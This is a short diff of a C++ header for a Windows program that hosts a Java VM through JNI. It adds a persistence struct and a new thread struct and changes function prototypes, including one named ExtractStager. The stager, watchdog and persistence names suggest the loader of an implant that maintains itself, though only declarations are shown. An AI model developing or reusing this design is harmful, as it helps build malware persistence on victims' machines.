@@ -4,6 +4,7 @@
 #include <Windows.h>
 #include <string>
 #include "include/jni.h"
+#include "../persist.h"
 
 #define COLON ":1"
 
@@ -17,17 +18,23 @@ typedef struct {
     unsigned long watchdog_pid;                   
     HANDLE thread_stop_event;
 	HANDLE jvm_thread;
-	std::string *dll_path;
+	PERSIST_STRUCT *persist_ptr;
 } WATCHDOG_THREAD_STRUCT, *PWATCHDOG_THREAD_STRUCT;
 
-BOOL WINAPI InvokeMain( std::string*, std::string );
+/*
+ * Struct for starting the watchdog thread
+ */
+typedef struct {
+    unsigned long watchdog_pid;                   
+    HANDLE thread_stop_event;
+	HANDLE jvm_thread;
+	PERSIST_STRUCT *persist_ptr;
+} JVM_THREAD_STRUCT, *PJVM_THREAD_STRUCT;
+
+BOOL WINAPI InvokeMain( std::string*, std::string, const char * );
 VOID WINAPI InvokeShutdown();
 bool ExtractStager( std::string passedPath );
 unsigned int __stdcall StartWatchDog(void* a);
-
-//BOOL PrepareJava(std::string, std::string &);
-//BOOL LoadJava(std::string);
-//void GetJavaVersion(std::string &);
 BOOL FileExists(std::string aString);
 
 char *GetJvmPath();
